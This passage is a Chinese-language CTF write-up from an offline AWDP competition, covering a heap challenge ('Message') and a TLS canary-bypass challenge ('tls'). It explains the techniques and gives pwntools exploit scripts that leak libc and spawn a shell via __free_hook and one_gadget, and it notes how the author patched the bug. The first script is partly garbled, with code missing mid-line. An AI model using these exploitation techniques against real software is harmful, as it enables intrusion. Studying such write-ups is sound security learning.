libc，我们可控的申请堆块只有使用calloc申请的message堆块，因为是使用calloc申请的，所以利用此来得到堆块的残留信息，并且这个堆块的申请范围也限制在了0x40到0x78之间，这使得我们无法直接的使用unsorted
bin来leak libc。
这里我的思路是，覆盖Message结构体中的message_ptr成员，改到一处我们伪造size在unsorted
bin范围中的堆块，这里选择的是0x91。
调试后发现，实际上这里存放phone的0x21空间，很适合用于伪造成0x91，并且这部分内容和我们之后用calloc申请的message_ptr相接，那部分的内容大小正好是0x71，这样的话也可以绕过glibc
prev检测（0x20 + 0x70 = 0x90）。
图中的第二行为伪造的0x71 size，用于fd指向并申请得到权限。
下面的0x21 size，通过前面申请得到的来修改为0x91。
其他数据按照原样还原即可（因为用calloc申请得到，数据都会被清0）
修改后再free一次就可以成功让这个堆块到unsortedbin中去，接着再把这个Message结构体申请回来，由于申请过程中，导致unsorted
bin堆块被分割，所以我们需要通过调试修正指针指向unsorted bin堆块位置，再进行一次show即可leak libc。
**GetShell**
leak
libc之后，我们再利用这个任意读写往__free_hook写system的地址，同时在随缘写一处sh\x00，最后free即可成功getshell。
**EXP**
    from pwn import *
    r = process('./Message')
    context.log_level = "debug"
    def choice(idx):
        r.sendlineafter("Your Choice: ", str(idx))
    def add(time, phone, size, message='x'):
        choice(1)
        r.sendlineafter("time: ", str(time))
        r.sendlineafter("phone number: ", str(phone))
        r.sendlineafter("size: ", str(size))
        if 0x3F  leak libc
    delete(0)
    add('sh\x00', 'sh\x00', 0x48, 'sh\x00')  # 0
    edit_message(4, p64(heap_base + 0x11d30) + p64(heap_base + 0x11d80))
    show(0)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c4b78
    log.success("libc_base:\t" + hex(libc_base))
    # getshell
    free_hook_addr = libc_base + 0x3c67a8
    system_addr = libc_base + 0x453a0
    edit_message(4, p64(free_hook_addr) + p64(heap_base + 0x11d30))
    edit_message(0, p64(system_addr))
    delete(0)
    r.interactive()
## tls
一种绕过canary的思路
###  程序一览
题目通过 **pthread_create** 来创建了一个线程
线程代码如下
一眼可以看出有一个三次机会的栈上任意写8字节，和最后的一个栈溢出。
题目存在canary，也就是要让我们利用三次机会的栈上任意写8字节来绕过canary保护。
使用 **pthread_create**
所创建的线程，glibc在TLS上的实现是存在问题的。由于栈是由高地址向低地址增长，而TLS是在内存的高地址上进行了初始化，使用这个函数所创建的线程用于栈的空间是在内存的低地址，并且距离这个TLS的空间距离很近，距离小于一页，这使得我们可以直接通过很长的溢出修改到TLS上canary的值，从而覆盖绕过canary
check。
###  防御
我最初的时候修复考虑到的是直接修复下面0x100长度的栈溢出，但是却被提示为服务异常。
接下来的修复，我就考虑在输入pos之后对pos进行一个check，如果pos大于0x30范围就直接进入check down环节，这样修复就成功了。
不得不说这个服务异常的check函数挺严格的，居然直接修栈溢出的方法都不行。
###  攻击
**绕过canary**
这道题的任意溢出正好符合这道题的条件，我这里直接用这个溢出来修改TLS上canary的值为’a’ *
8（和溢出数据中的canary一致）即可绕过canary。
**如何定位到TLS上的canary？**
如图所示的命令，在fs[0x28]的位置，实际上就是在TLS中储存canary的位置，我们可以调试并确定偏移大小。
**Leak libc**
这道题没有开PIE，可以多次利用，所以泄露libc的难度不大，我这里分享一种我的开启PIE也可以打通的方法
这种方法的本质，就是部分覆盖返回指针，使其指向到调用本函数之前的位置，这样再返回的时候，又会重新执行call函数再次调用这个函数。
这里在fs:[0x640]中存放的指针就是本函数的指针
所以，我们就借助了程序中输出名称的功能
成功的泄露出了libc的地址（因为返回地址就是libc上的某个位置，而溢出的内容中不存在\x00，就全部都连续起来了）
**EXP**
    from pwn import *
    r = process('./tls2')
    #r = remote('172.16.9.2', 9004)
    context.log_level = "debug"
    def choice(idx):
        r.sendlineafter("choice: ", str(idx))
    def edit(n, data):
        choice(1)
        r.sendlineafter("Please input pos: ", str(n))
        choice(2)
        r.sendlineafter("number: ", str(u64(data.ljust(8, '\x00'))))
    def exit_loop():
        choice(4)
    #change tls canary
    r.sendlineafter("How many? ", "1")
    r.sendlineafter("num_list[0] = ", "1")
    edit(0x13b, 'a' * 8)
    #leak libc
    exit_loop()
    payload = 'a' * 56 + 'a' * 8 + 'b' * 8 + '\xb2'
    r.sendafter('name? ', payload)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x7536b2
    log.success("libc_base: " + hex(libc_base))
    #getshell
    r.sendlineafter("How many? ", "1")
    r.sendlineafter("num_list[0] = ", "1")
    exit_loop()
    one = [0x4527a, 0xf0364, 0xf1207]
    one_gadget = libc_base + one[0]
    payload2 = 'a' * 56 + 'a' * 8 + 'b' * 8 + p64(one_gadget)
    r.sendafter('name? ', payload2)
    r.interactive()
## 总结
这样的PWN题难度在线上赛中其实算是比较低的，不过听说Web的题目质量应该还是很高的。但是由于是第一次参加线下AWDP比赛，比赛过程中也很紧张，修复题目漏洞和写exp速度都太慢了些，导致在比赛中直接被打爆了（
~~就当去旅游了吧~~ ），通过这次比赛遇到了很多大佬，也学到了很多AWDP的知识，真希望明年还能再来打一次！（
~~大概还有三次机会吧，希望能拿一次奖）~~